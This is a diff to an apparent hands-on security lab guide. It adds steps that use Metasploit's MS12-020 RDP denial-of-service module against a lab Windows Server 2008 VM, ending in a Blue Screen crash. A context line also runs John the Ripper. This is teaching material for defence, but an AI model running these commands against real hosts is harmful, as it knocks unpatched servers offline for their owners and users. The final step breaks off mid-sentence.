@@ -160,4 +160,24 @@ sudo john filename.txt
 6. Go to Windows Firewall with Advanced Security and check that the Inbound Rule to allow Remote Desktop connections to TCP Port 3389 is enabled
 7. Go to Control Panel > Programs > View Installed Updates and check the list of security updates containing the Knowledge Base number for the MS12-020 security bulletin
 8. If the patch is listed, remove and start the Win2008 VM
-9. If not, Win2008 is not patched against this 
+9. If not, Win2008 is not patched against this vulnerability
+
+**On Kali VM**
+10. On Metasploit, search for exploits related to MS12-020:
+```
+search ms12_020
+```
+11. Select the exploit
+```
+use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
+```
+12. Set Win2008 as the RHOST
+```
+set RHOST Win2008-IP
+```
+13.  Type `show options` to view the set options
+14. Run the exploit
+```
+exploit
+```
+15. The Blue Screen of Death appears in the Win2008 VM (restart it to )
